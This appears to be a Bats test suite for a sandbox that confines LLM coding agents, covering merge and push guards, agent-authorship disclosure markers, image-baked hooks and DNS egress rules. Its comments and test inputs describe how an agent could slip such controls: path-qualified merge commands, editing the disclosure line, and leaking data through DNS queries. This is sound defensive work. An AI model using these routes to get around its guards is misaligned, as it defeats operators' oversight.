        || { echo "the github manifest no longer declares --repo"; return 1; }
    grep -qE '^repo_env[[:space:]]*=[[:space:]]*GH_REPO' "$conf" \
        || { echo "the github manifest no longer declares GH_REPO"; return 1; }
    # And core passes all of them through, or the manifest is a declaration
    # nothing reads.
    grep -qE '^repo_paths[[:space:]]*=[[:space:]]*api:repos' "$conf" \
        || { echo "the github manifest no longer declares the api path form"; return 1; }
    local v
    for v in DEJIMA_FORGE_REPO DEJIMA_FORGE_REPO_FLAGS DEJIMA_FORGE_REPO_ENV \
             DEJIMA_FORGE_REPO_PATHS; do
        grep -q "\-e \"$v=" "$REPO_ROOT/bin/dejima" \
            || { echo "$v never reaches the container"; return 1; }
    done
}

@test "github-pr ships and is declared, and only reads" {
    # The one thing gh cannot do (#186): thread resolution is GraphQL-only, so
    # `gh pr view --comments` shows resolved and unresolved alike. A tool that
    # ships without being declared in `install` is one install-forge-bins.sh
    # refuses to build, and the declaration is what an operator reads to know
    # what a forge puts in the image.
    local tool="$REPO_ROOT/forges/github/bin/github-pr"
    [ -x "$tool" ] || { echo "github-pr is missing or not executable"; return 1; }
    grep -qE '^install[[:space:]]*=.*bin/github-pr' "$REPO_ROOT/forges/github/forge.conf" \
        || { echo "github-pr is not declared in the github manifest's install"; return 1; }
    # It reads. A write would need the authorship disclosure, and the
    # disclosure is keyed on gh - so a write here would be undisclosed.
    #
    # `mutation` is in the pattern because this tool exists to reach GraphQL,
    # which is the one route the rest of the pattern cannot see: a GraphQL
    # write is a POST to one endpoint with the verb in the query body, so it
    # matches no subcommand and needs no --method (#245).
    run grep -nEi '(gh (pr|issue) (create|edit|comment|merge|close|reopen))|-X (POST|PATCH|PUT|DELETE)|--method|\bmutation\b' "$tool"
    [ "$status" -ne 0 ] || { echo "github-pr writes:"; echo "$output"; return 1; }
}

# --- the authorship disclosure ----------------------------------------------
#
# The marker used to live in the two CLIs this repo wrote, which made "does
# dejima say an agent wrote this" depend on which forge an operator picked.
# It lives in the shadow now, so these are about the shadow.

# A shadow over a stub that reports which body it was handed, however it was
# spelled. Echoes the body back so a test can assert on what the real CLI
# would have sent, not on what the shim's argv looked like.
_disclose_shim() {
    local d="$1"; shift
    mkdir -p "$d/real"
    cat > "$d/real/forge-cli" <<'STUB'
#!/bin/bash
body=""
while [ "$#" -gt 0 ]; do
    case "$1" in
        --body-file) body="$(cat -- "$2")"; shift 2; continue ;;
        --body-file=*) body="$(cat -- "${1#--body-file=}")"; shift; continue ;;
        --body) body="$2"; shift 2; continue ;;
        --body=*) body="${1#--body=}"; shift; continue ;;
    esac
    shift
done
printf '%s' "$body"
STUB
    chmod +x "$d/real/forge-cli"
    cp "$SANDBOX_DIR/forge-guard.sh" "$d/forge-cli"
    chmod +x "$d/forge-cli"
    DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real" \
        DEJIMA_DISCLOSE="$DISCLOSE" "$d/forge-cli" "$@"
}

@test "the marker is added once, whatever the body already says" {
    # Every issue on a project worked on this way opens with the marker, so an
    # agent reading the existing ones concludes it is the house style and
    # writes it in - and a second was added. Each doubled artifact taught the
    # next agent to do the same, so it spread rather than settling.
    #
    # The marker is a statement and not a count: a body that already opens by
    # saying an agent wrote it has disclosed the thing this exists to
    # disclose.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/twice.XXXXXX")"
    local DISCLOSE="issue forge-cli create"
    local marker='**Filed by LLM agent**'
    local f="$d/body"
    printf '%s\n\nProse.\n' "$marker" > "$f"

    # All four spellings, because two of them used to prepend the marker at
    # their own call site rather than through the shared function - so a rule
    # added in one place was not in force in the other.
    local out
    out="$(_disclose_shim "$d" create --body-file "$f")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 1 ] \
        || { echo "--body-file doubled it: $out"; return 1; }
    out="$(_disclose_shim "$d" create "--body-file=$f")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 1 ] \
        || { echo "--body-file= doubled it: $out"; return 1; }
    out="$(_disclose_shim "$d" create --body "$(cat "$f")")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 1 ] \
        || { echo "--body doubled it: $out"; return 1; }
    out="$(_disclose_shim "$d" create "--body=$(cat "$f")")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 1 ] \
        || { echo "--body= doubled it: $out"; return 1; }

    # The same words further down are prose ABOUT disclosure, not the
    # disclosure, and still get one prepended.
    printf 'Prose first.\n\n%s\n' "$marker" > "$f"
    out="$(_disclose_shim "$d" create --body-file "$f")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 2 ] \
        || { echo "a mention in the body was read as the disclosure: $out"; return 1; }

    # Trailing whitespace after it is still just the marker: invisible, and
    # changing nothing about what the line says.
    printf '%s   \n\nProse.\n' "$marker" > "$f"
    out="$(_disclose_shim "$d" create --body-file "$f")"
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 1 ] \
        || { echo "trailing space stopped it counting as disclosed: $out"; return 1; }
}

@test "a marker with the session's own words welded on gets a clean one" {
    # Skipping on a PREFIX made the marker line agent-authorable: the body
    # opens with the marker, adds to it on the same line, and the disclosure
    # dejima writes is the one the session finished. dejima says one thing
    # about agent authorship, and this is the line it says it on.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/weld.XXXXXX")"
    local DISCLOSE="issue forge-cli create"
    local marker='**Filed by LLM agent**'
    local f="$d/body" out
    printf '%s - reviewed and confirmed by a person\n\nProse.\n' "$marker" > "$f"
    out="$(_disclose_shim "$d" create --body-file "$f")"
    # A clean marker line of its own, above whatever the session wrote.
    [ "$(head -1 <<< "$out")" = "$marker" ] \
        || { echo "the first line is the session's: $(head -1 <<< "$out")"; return 1; }
    [ "$(grep -c 'Filed by LLM agent' <<< "$out")" -eq 2 ] \
        || { echo "the welded line was accepted as the disclosure: $out"; return 1; }
}

@test "the session is told the marker is added for it" {
    # The other half, and the one that stops it being written in the first
    # place: a session that is not told concludes from the existing issues
    # that typing it is the house style.
    local out
    out="$(DEJIMA_DISCLOSE='issue gitea-issue create' bash -c \
        'source "$1"; briefing_compose gitea worktree-pr claude-code' _ \
        "$REPO_ROOT/bin/dejima-provider-lib.sh" 2>&1)" || { echo "$out"; return 1; }
    grep -q 'Do not write that line' <<< "$out" \
        || { echo "the briefing does not tell the session"; return 1; }

    # And is not told when nothing would add one, which would be telling it
    # something false and inviting exactly the behaviour being prevented.
    out="$(DEJIMA_DISCLOSE= bash -c \
        'source "$1"; briefing_compose none local-only claude-code' _ \
        "$REPO_ROOT/bin/dejima-provider-lib.sh" 2>&1)" || { echo "$out"; return 1; }
    grep -q 'Do not write that line' <<< "$out" \
        && { echo "told about a marker nothing adds"; return 1; }
    return 0
}

@test "an agent-authored body says so, in every spelling the CLIs accept" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/disclose.XXXXXX")"
    local DISCLOSE="pr forge-cli create"
    local f="$d/body"
    printf 'Line one.\n\nLine two.\n' > "$f"

    # --body-file is what the briefing tells a session to use, and the other
    # three are what it might reach for anyway.
    local out
    out="$(_disclose_shim "$d" create --title T --body-file "$f")"
    [[ "$out" == "**Summary generated by LLM agent**"* ]] || { echo "$out"; return 1; }
    [[ "$out" == *"Line one."*"Line two."* ]] || { echo "$out"; return 1; }

    out="$(_disclose_shim "$d" create --title T --body-file="$f")"
    [[ "$out" == "**Summary generated by LLM agent**"*"Line two."* ]] || { echo "$out"; return 1; }

    out="$(_disclose_shim "$d" create --title T --body "typed inline")"
    [[ "$out" == "**Summary generated by LLM agent**"*"typed inline"* ]] || { echo "$out"; return 1; }

    out="$(_disclose_shim "$d" create --title T --body=typed)"
    [[ "$out" == "**Summary generated by LLM agent**"*"typed"* ]] || { echo "$out"; return 1; }

    # And from stdin, which is the only one where the shim reading the body is
    # the only chance to prepend to it: the CLI behind it cannot read it twice.
    out="$(printf 'piped in\n' | _disclose_shim "$d" create --body-file -)"
    [[ "$out" == "**Summary generated by LLM agent**"*"piped in"* ]] || { echo "$out"; return 1; }
}

@test "the marker matches the kind of thing being written" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/disclosekind.XXXXXX")"
    local DISCLOSE="pr forge-cli pr create
issue forge-cli issue create
comment forge-cli issue comment"
    local out
    out="$(_disclose_shim "$d" pr create --body x)"
    [[ "$out" == *"Summary generated by LLM agent"* ]] || { echo "$out"; return 1; }
    out="$(_disclose_shim "$d" issue create --body x)"
    [[ "$out" == *"Filed by LLM agent"* ]] || { echo "$out"; return 1; }
    out="$(_disclose_shim "$d" issue comment --body x)"
    [[ "$out" == *"Comment by LLM agent"* ]] || { echo "$out"; return 1; }
}

@test "an edit is disclosed too, so revising a body does not shed the marker" {
    # The property the CLIs used to hold themselves: the marker describes where
    # the text came from, not the event that wrote it.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/discloseedit.XXXXXX")"
    local DISCLOSE="pr forge-cli edit"
    local out
    out="$(_disclose_shim "$d" edit 7 --body "revised")"
    [[ "$out" == *"Summary generated by LLM agent"*"revised"* ]] || { echo "$out"; return 1; }
}

@test "a command with nothing authored about it is passed through untouched" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/disclosepass.XXXXXX")"
    local DISCLOSE="pr forge-cli create"
    local out

    # Not in the list.
    out="$(_disclose_shim "$d" list --body "x")"
    [ "$out" = "x" ] || { echo "list was marked: $out"; return 1; }

    # In the list, but carrying no body at all - gh pr create --fill is this
    # case. Marking would mean inventing a body the session did not write.
    out="$(_disclose_shim "$d" create --title T)"
    [ -z "$out" ] || { echo "a bodyless create grew one: $out"; return 1; }

    # A flag's value does not stop the match, the same way it does not for a
    # blocked merge.
    out="$(_disclose_shim "$d" --repo o/r create --body "x")"
    [[ "$out" == *"LLM agent"* ]] || { echo "--repo hid the create: $out"; return 1; }
}

@test "a body file the CLI would have refused is refused here, not sent empty" {
    # The shadow reads --body-file and hands the CLI a temp file, which always
    # exists - so the CLI's own check on that argument can never fire again,
    # and whatever the shadow read is what gets published. Before this, a
    # mistyped path produced a PR whose entire body was the marker, created
    # rather than refused, and /dev/zero filled a temp file until the disk did.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/disclosebody.XXXXXX")"
    local DISCLOSE="pr forge-cli create"
    local bad out
    for bad in "$d/nope" /dev/zero "$d"; do
        run timeout 5 env DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real" \
            DEJIMA_DISCLOSE="$DISCLOSE" bash -c '
                mkdir -p "$1/real"
                printf "#!/bin/sh\necho CLI-RAN\n" > "$1/real/forge-cli"
                chmod +x "$1/real/forge-cli"
                cp "$2" "$1/forge-cli"; chmod +x "$1/forge-cli"
                "$1/forge-cli" create --title T --body-file "$3"' \
            _ "$d" "$SANDBOX_DIR/forge-guard.sh" "$bad"
        [ "$status" -ne 124 ] || { echo "hung on $bad"; return 1; }
        [ "$status" -ne 0 ] || { echo "accepted $bad: $output"; return 1; }
        [[ "$output" == *"not a readable file"* ]] \
            || { echo "refused $bad without saying why: $output"; return 1; }
        [[ "$output" != *"CLI-RAN"* ]] \
            || { echo "ran the CLI anyway for $bad"; return 1; }
    done
}

@test "the body is marked once, not once per body argument" {
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/disclosetwice.XXXXXX")"
    local DISCLOSE="pr forge-cli create"
    local out count
    out="$(_disclose_shim "$d" create --body "x")"
    count="$(grep -c 'LLM agent' <<< "$out")"
    [ "$count" = "1" ] || { echo "marked $count times: $out"; return 1; }
}

@test "both shipped forges disclose on every command that writes a body" {
    # Driven from the manifests rather than from a list repeated here, so a
    # forge added later is held to the same rule instead of being forgotten.
    # The point is coverage, not wording: every command that takes a body must
    # be accounted for, and the kinds must be ones the shadow knows.
    local conf forge spec entry kind seen
    for conf in "$REPO_ROOT"/forges/*/forge.conf; do
        forge="$(basename "$(dirname "$conf")")"
        [ -n "$(lib manifest_get forge "$forge" pr_command)" ] || continue
        spec="$(lib manifest_get forge "$forge" disclose)"
        [ -n "$spec" ] || { echo "forge $forge writes PRs and discloses nothing"; return 1; }
        seen=""
        while IFS= read -r entry; do
            [ -n "$entry" ] || continue
            kind="${entry%%:*}"
            grep -q "^        $kind)" "$SANDBOX_DIR/forge-guard.sh" \
                || { echo "forge $forge uses kind '$kind', which the shadow has no marker for"; return 1; }
            seen="$seen $kind"
        done <<< "$(tr ',' '\n' <<< "$spec" | sed 's/^ *//; s/ *$//')"
        # create and edit for both artifacts, plus a comment: five commands,
        # covering all three kinds. A forge declaring only one would pass a
        # weaker check while leaving issues unmarked.
        local k
        for k in pr issue comment; do
            [[ "$seen" == *" $k"* ]] || { echo "forge $forge never discloses a $k"; return 1; }
        done
    done
}

@test "a forge CLI sits behind the shadow, with the name on PATH a symlink to it" {
    # The guard needs a fixed path to exec the real binary through, which is
    # what the indirection buys - and it is what lets entrypoint.sh swap the
    # PATH entry for the guard without moving anything at runtime.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/forgeinstall.XXXXXX")"
    run _install_forge_bins "$REPO_ROOT/forges" "$d/lib" "$d/bin"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    local f
    for f in "$d/bin"/*; do
        [ -L "$f" ] || { echo "$(basename "$f") on PATH is not a symlink"; return 1; }
        [ -x "$d/lib/$(basename "$f")" ] || { echo "no real binary behind $(basename "$f")"; return 1; }
    done
}

@test "every command a forge names ends up behind the shadow" {
    # The invariant #184 was a violation of. The entrypoint refuses to start
    # when a workflow's merge block names a command that is not at
    # /usr/local/lib/dejima/forge, so a forge naming one it never installs is
    # not a degraded guard - it is a container that does not come up, in the
    # only workflow that opens PRs.
    #
    # Checked against install-forge-bins.sh's real output rather than against
    # the `install` list, because what matters is where a command ends up and
    # not what a manifest says about it.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/shadow.XXXXXX")"
    run _install_forge_bins "$REPO_ROOT/forges" "$d/lib" "$d/bin"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }

    local conf forge key value cli checked=0
    for conf in "$REPO_ROOT"/forges/*/forge.conf; do
        forge="$(basename "$(dirname "$conf")")"
        for key in pr_command issue_command merge_block; do
            value="$(lib manifest_get forge "$forge" "$key")"
            [ -n "$value" ] || continue
            cli="${value%% *}"
            [ -e "$d/lib/$cli" ] \
                || { echo "forge $forge names '$value' but nothing installs '$cli'"; return 1; }
            checked=$((checked + 1))
        done
    done
    # gitea's three and github's three. A loop that silently matched nothing
    # would pass this test while checking no forge at all.
    [ "$checked" -ge 6 ] || { echo "only checked $checked commands"; return 1; }
}

@test "the entrypoint links each guard only when it has something to enforce" {
    local e="$SANDBOX_DIR/entrypoint.sh"
    grep -q 'ln -sf /usr/local/lib/dejima/git-guard.sh /usr/local/bin/git' "$e" \
        || { echo "git is never shadowed"; return 1; }
    grep -q 'ln -sf /usr/local/lib/dejima/forge-guard.sh' "$e" \
        || { echo "the forge CLI is never shadowed"; return 1; }
    # Both are conditional: a launch with no push hosts and no merge block
    # should leave PATH as the image left it.
    grep -q 'if \[ -n "${DEJIMA_PUSH_HOSTS:-}${DEJIMA_BLOCKED_BRANCHES:-}" \]' "$e" \
        || { echo "the git shadow is unconditional"; return 1; }
    # The shadow is linked for whatever the forge and workflow between them
    # ask for - a blocked merge, a body to disclose on, or both - and for
    # nothing when they ask for neither.
    grep -q 'if \[ -n "$_shadow_cli_list" \]' "$e" \
        || { echo "the forge shadow is unconditional"; return 1; }
    grep -q 'DEJIMA_MERGE_BLOCK' "$e" \
        || { echo "a blocked merge no longer reaches the shadow"; return 1; }
    grep -q 'DEJIMA_DISCLOSE' "$e" \
        || { echo "a disclosure no longer reaches the shadow"; return 1; }
    # And a merge_block naming a command the forge does not ship is refused
    # rather than looking enforced.
    grep -q 'does not install. Nothing is being enforced' "$e" \
        || { echo "naming a CLI the forge lacks is silent"; return 1; }
}

@test "merge-guard.sh blocks a sandbox merge and is a no-op on the host" {
    local hook="$REPO_ROOT/hooks/merge-guard.sh"
    local payload

    # Blocked in the sandbox, including path-qualified - /usr/local/bin is
    # where the image puts it, so a bare-name-only pattern would miss the
    # form an agent reaching past PATH would type.
    local cmd
    for cmd in 'gitea-pr merge 24' '/usr/local/bin/gitea-pr merge 24' 'cd /tmp && gitea-pr merge 24'; do
        payload=$(jq -n --arg c "$cmd" '{tool_input: {command: $c}}')
        run bash -c "printf '%s' \"\$1\" | DEJIMA=1 DEJIMA_MERGE_BLOCK='gitea-pr merge' bash '$hook'" _ "$payload"
        [ "$status" -eq 2 ]
        [[ "$output" == *"merge-guard.sh"* ]]
    done

    # The other verbs are the whole point of the tool and must pass through.
    for cmd in 'gitea-pr create --title x' 'gitea-pr comments 24' 'gitea-issue close 14'; do
        payload=$(jq -n --arg c "$cmd" '{tool_input: {command: $c}}')
        run bash -c "printf '%s' \"\$1\" | DEJIMA=1 DEJIMA_MERGE_BLOCK='gitea-pr merge' bash '$hook'" _ "$payload"
        [ "$status" -eq 0 ]
    done

    # Outside the sandbox it does nothing at all: an operator at a host shell
    # can still be asked to merge, which is what the CLAUDE.md rule allows.
    # env -u rather than DEJIMA= because the image sets DEJIMA=1 globally, so
    # a test running inside dejima would otherwise assert against itself.
    payload=$(jq -n '{tool_input: {command: "gitea-pr merge 24"}}')
    run bash -c "printf '%s' \"\$1\" | env -u DEJIMA DEJIMA_MERGE_BLOCK='gitea-pr merge' bash '$hook'" _ "$payload"
    [ "$status" -eq 0 ]
}

@test "the merge guard is registered into the sandbox's own settings overlay" {
    # In the harness plugin, gated on the manifest declaring the guard - and
    # into the overlay rather than the operator's ~/.claude/settings.json, so
    # installing dejima does not edit a config that is not dejima's.
    local p="$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'harness_has_guard merge-guard && _register_overlay_hook PreToolUse Bash merge-guard.sh' "$p" \
        || { echo "the merge guard is not registered in the overlay"; return 1; }
    # And no longer written to the host at all.
    grep -q '_register PreToolUse Bash merge-guard.sh' "$p" \
        && { echo "the merge guard is still registered on the host"; return 1; }
    grep -q '_link_hook' "$p" \
        && { echo "hooks are still symlinked into ~/.claude/hooks"; return 1; }
    return 0
}

@test "the sandbox's hooks are baked into the image, not read from a host mount" {
    # A guard whose script can be replaced under a running session is not one.
    # Baked, so it is root-owned and outside anything the session can write -
    # the property the read-only ~/.claude/hooks mount used to provide.
    local h
    for h in sandbox-context.sh git-push-guard.sh merge-guard.sh dejima-notify.sh \
             deny-dangerous-bash.sh; do
        grep -q "COPY hooks/$h /usr/local/lib/dejima/hooks/$h" "$REPO_ROOT/docker/Dockerfile" \
            || { echo "$h is not baked into the image"; return 1; }
    done
    # Every one of them, with nothing left registered on the host: the point
    # is that installing dejima does not change how the harness behaves
    # outside a sandbox, and one exception would undo that.
    grep -q '_register PreToolUse' "$REPO_ROOT/bin/harness/claude-code.sh" \
        && { echo "something is still registered on the host"; return 1; }
    return 0
}

# Runs install.sh against a throwaway HOME, with a stub `docker` on PATH so
# its tool check passes somewhere without one (this suite is the no-Docker
# half). Everything the script writes - hook symlinks, ~/.local/bin,
# settings.json, the starter config - lands under that HOME.
run_install() {
    local home="$1"
    mkdir -p "$home/stub"
    printf '#!/bin/sh\nexit 0\n' > "$home/stub/docker"
    chmod +x "$home/stub/docker"
    env HOME="$home" PATH="$home/stub:$PATH" DEJIMA_CONFIG_DIR="$home/config" \
        bash "$REPO_ROOT/install.sh"
}

# Every registered hook command, one per line.
registered_commands() {
    jq -r '[.hooks[]?[]?.hooks[]?.command // empty] | .[]' "$1/.claude/settings.json"
}

@test "install.sh replaces the pre-rename gitea-merge-guard.sh registration rather than reading it as one" {
    # Asserted by running it, not by grepping it: the bug this covers was a
    # register_hook call that was present in the source and did nothing. Its
    # dedupe matched the pre-rename command string as a substring, so the
    # merge guard was registered nowhere while install.sh reported success,
    # and every session start reported the missing hook the stale entry
    # still named.
    local home="$BATS_TEST_TMPDIR/h"
    mkdir -p "$home/.claude/hooks"
    ln -s "$REPO_ROOT/hooks/gone.sh" "$home/.claude/hooks/gitea-merge-guard.sh"
    jq -n '{hooks: {PreToolUse: [{matcher: "Bash", hooks: [{type: "command",
        command: "$HOME/.claude/hooks/gitea-merge-guard.sh"}]}]}}' \
        > "$home/.claude/settings.json"

    run_install "$home"

    run registered_commands "$home"
    [[ "$output" != *"gitea-merge-guard.sh"* ]]
    [ ! -e "$home/.claude/hooks/gitea-merge-guard.sh" ]
    # And no merge-guard registration replaces it on the host: the sandbox
    # registers its own into the settings overlay now.
    [ "$(registered_commands "$home" | grep -c '/merge-guard\.sh$')" -eq 0 ] \
        || { echo "merge-guard.sh was registered on the host"; return 1; }
}

@test "install.sh registers each hook exactly once across repeated runs" {
    # The other direction of the same dedupe: an exact match must still
    # match. A re-run after a git pull is the common case, and duplicate
    # registrations would run every guard twice.
    local home="$BATS_TEST_TMPDIR/h2" cmd
    run_install "$home"
    run_install "$home"

    while read -r cmd; do
        [ "$(registered_commands "$home" | grep -cxF "$cmd")" -eq 1 ]
    done < <(registered_commands "$home")
    # None. Every hook is registered per launch into the settings overlay, so
    # a re-run after a git pull has nothing to duplicate - which is the
    # strongest form of what this test was checking.
    [ "$(registered_commands "$home" | wc -l)" -eq 0 ] \
        || { echo "host registrations: $(registered_commands "$home")"; return 1; }
}

@test "the push guard names no forge, and blocks everything when no host is allowed" {
    run grep -ci gitea "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$output" = "0" ]
    d="$(mktemp -d)"
    git -C "$d" init -q
    git -C "$d" remote add origin git@anywhere.example:x/y
    git -C "$d" checkout -qb feature
    payload="$(printf '{"tool_input":{"command":"git push origin feature"},"cwd":"%s"}' "$d")"
    # No hosts allowed at all: every push is refused.
    run env DEJIMA=1 DEJIMA_PUSH_HOSTS="" DEJIMA_BLOCKED_BRANCHES="" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$status" -eq 2 ]
    # Allowed host: permitted.
    run env DEJIMA=1 DEJIMA_PUSH_HOSTS="anywhere.example" DEJIMA_BLOCKED_BRANCHES="" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$status" -eq 0 ]
    rm -rf "$d"
}

@test "the merge guard is inert without a configured block pattern" {
    payload='{"tool_input":{"command":"gitea-pr merge 1"},"cwd":"/tmp"}'
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/merge-guard.sh"
    [ "$status" -eq 0 ]
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="gitea-pr merge" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/merge-guard.sh"
    [ "$status" -eq 2 ]
}

@test "a merge-block pattern cannot inject a regex" {
    payload='{"tool_input":{"command":"echo hello"},"cwd":"/tmp"}'
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK=".*" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/merge-guard.sh"
    [ "$status" -eq 0 ]
}

@test "an empty DEJIMA_PUSH_HOSTS blocks every push, pinning the fail-closed direction" {
    # DEJIMA_PUSH_HOSTS fails CLOSED: a workflow that never pushes, or an
    # unconfigured forge, must not silently become a workflow that can push
    # anywhere. This must hold even with other hosts and an unrelated
    # (empty) branch policy present, so a later change can't narrow the
    # test to pass while still widening what the guard actually permits.
    d="$(mktemp -d)"
    git -C "$d" init -q
    git -C "$d" remote add origin git@forge.example:x/y
    git -C "$d" checkout -qb feature
    payload="$(printf '{"tool_input":{"command":"git push origin feature"},"cwd":"%s"}' "$d")"
    run env DEJIMA=1 DEJIMA_PUSH_HOSTS="" DEJIMA_BLOCKED_BRANCHES="main" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$status" -eq 2 ]
    [[ "$output" == *"Blocked"* ]]
    rm -rf "$d"
}

@test "an empty DEJIMA_BLOCKED_BRANCHES allows a push to main, pinning the fail-open direction" {
    # DEJIMA_BLOCKED_BRANCHES fails OPEN: a workflow with genuinely no
    # branch policy must not have one manufactured for it by a failure to
    # read the value. The host is explicitly allowed here so only the
    # branch check is under test.
    d="$(mktemp -d)"
    git -C "$d" init -q
    git -C "$d" remote add origin git@forge.example:x/y
    git -C "$d" checkout -qb main
    payload="$(printf '{"tool_input":{"command":"git push origin main"},"cwd":"%s"}' "$d")"
    run env DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.example" DEJIMA_BLOCKED_BRANCHES="" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$status" -eq 0 ]
    rm -rf "$d"
}

@test "an empty DEJIMA_MERGE_BLOCK allows the merge command through, pinning the fail-open direction" {
    # DEJIMA_MERGE_BLOCK fails OPEN: a forge/workflow combination with no
    # merge command to block must leave the hook inert rather than block
    # everything (or nothing meaningful) by accident.
    payload='{"tool_input":{"command":"gitea-pr merge 24 --admin"},"cwd":"/tmp"}'
    run env DEJIMA=1 DEJIMA_MERGE_BLOCK="" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/merge-guard.sh"
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}


@test "an answer pointing into a private network is refused, in two places" {
    # An answer decides what the allow-list contains, and an answer comes from
    # outside: a permitted public name answered with an internal address would
    # be egress to a host on the operator's own network, on every port, granted
    # by something neither the operator nor the session chose.
    #
    # Stated twice on purpose. The resolver refuses the answer before handing
    # it out; the packet filter refuses the address independently, so the guard
    # does not rest on one component being configured correctly.
    grep -qE '^stop-dns-rebind$' "$SANDBOX_DIR/egress-policy" \
        || { echo "the resolver does not refuse an answer pointing inside"; return 1; }
    grep -q "rebind-domain-ok=/%s/" "$SANDBOX_DIR/egress-policy" \
        || { echo "there is no per-entry exemption, so the check is all or nothing"; return 1; }
    grep -q 'daddr @nonglobal_v4 ip daddr != @internal_ok_v4 goto refuse' "$SANDBOX_DIR/egress-policy" \
        || { echo "the packet filter does not state the rule independently"; return 1; }

    # And the guard has to sit above the loopback pass, or an answer of
    # 127.0.0.1 reaches its destination without ever meeting it.
    local chain guard lo
    chain=$(sed -n '/chain egress {/,/^  }/p' "$SANDBOX_DIR/egress-policy")
    guard=$(grep -n 'nonglobal_v4' <<< "$chain" | head -1 | cut -d: -f1)
    lo=$(grep -n 'oifname "lo" accept' <<< "$chain" | head -1 | cut -d: -f1)
    [ -n "$guard" ] && [ -n "$lo" ] || { echo "could not find both rules in the chain"; return 1; }
    [ "$guard" -lt "$lo" ] \
        || { echo "the non-global guard is below the loopback pass, so a loopback answer skips it"; return 1; }
}



@test "the session user cannot address a resolver outside this namespace" {
    # The name allow-list only means anything if the session cannot pick its
    # own resolver. An arbitrary name sent to an arbitrary resolver carries data
    # out in the query itself, whether or not the connection that would follow
    # is ever permitted.
    #
    # Restricted by uid rather than refused outright, and the exception is not
    # an oversight: the container runtime's own embedded resolver forwards
    # onwards from inside this namespace on some versions, as root, and without
    # that every lookup times out having been permitted. The session user is
    # uid 1000 with no sudo, no setuid binary and no way to change uid, so the
    # channel stays closed for the thing this exists to contain.
    local p="$SANDBOX_DIR/egress-policy"
    grep -q 'meta skuid \$resolver_uid ip daddr @upstream_v4 goto permit' "$p" \
        || { echo "the forwarder has no route to an upstream resolver"; return 1; }
    grep -q 'meta skuid 0 udp dport 53 goto permit' "$p" \
        || { echo "the runtime's own resolver cannot forward, so every lookup will time out"; return 1; }
    grep -q 'ip daddr @upstream_v4 goto refuse' "$p" \
        || { echo "an unprivileged process can still reach the upstream resolver"; return 1; }
    grep -qE '^\s+udp dport \{ 53, 853 \} goto refuse$' "$p" \
        || { echo "DNS to an arbitrary destination is not refused"; return 1; }

    # The uid exception must be exactly root and the forwarder - a third one
    # would be a widening with no stated reason.
    local uids
    uids=$(grep -oE 'meta skuid [^ ]+' "$p" | sort -u)
    [ "$(wc -l <<< "$uids")" -eq 2 ] \
        || { echo "unexpected set of uids may reach a resolver:"; echo "$uids"; return 1; }

    # And the cost of the root exception is stated where the rule is, rather
    # than left for a reader to work out.
    grep -q 'Root in the session container' "$p" \
        || { echo "the root exception does not say what it costs"; return 1; }

    # The permission is a uid match, so the account it names has to be one
    # nothing else runs as - and the image is what guarantees that.
    grep -q 'RESOLVER_USER=egress-resolver' "$p" \
        || { echo "the resolver account is not the dedicated one"; return 1; }
    grep -q 'useradd -r -M -s /usr/sbin/nologin egress-resolver' "$SANDBOX_DIR/Dockerfile" \
        || { echo "the image does not create the account the rule is keyed to"; return 1; }

    # And it is verified at runtime, because a resolver that failed to drop
    # would leave the rule keyed to an account nothing is using.
    grep -q 'not \$RESOLVER_USER, so the rule permitting it to reach an upstream' "$p" \
        || { echo "nothing checks the resolver actually runs as that account"; return 1; }
}

@test "the policy waits for the resolver to answer, not just to exist" {
    # dnsmasq daemonizes and its parent returns almost immediately, so a check
    # on the process succeeds while the child is still binding. A query sent
    # into that window is refused by the kernel rather than answered, and every
    # check after it reads that as the policy refusing a name it permits - a
    # container that fails to start, intermittently, over nothing.
    local p="$SANDBOX_DIR/egress-policy"
    local block
    block=$(sed -n '/^start_resolver()/,/^}/p' "$p")
    grep -q 'dig ' <<< "$block" \
        || { echo "start_resolver never asks the resolver whether it is answering"; return 1; }
    # The probe has to be a name that must NOT resolve. Waiting on one that
    # should would conflate "the resolver is up" with "the forward worked",
    # which is the next check's question and a different failure.
    grep -q 'PROBE_NAME' <<< "$block" \
        || { echo "the readiness probe uses a name whose answer depends on the forward"; return 1; }
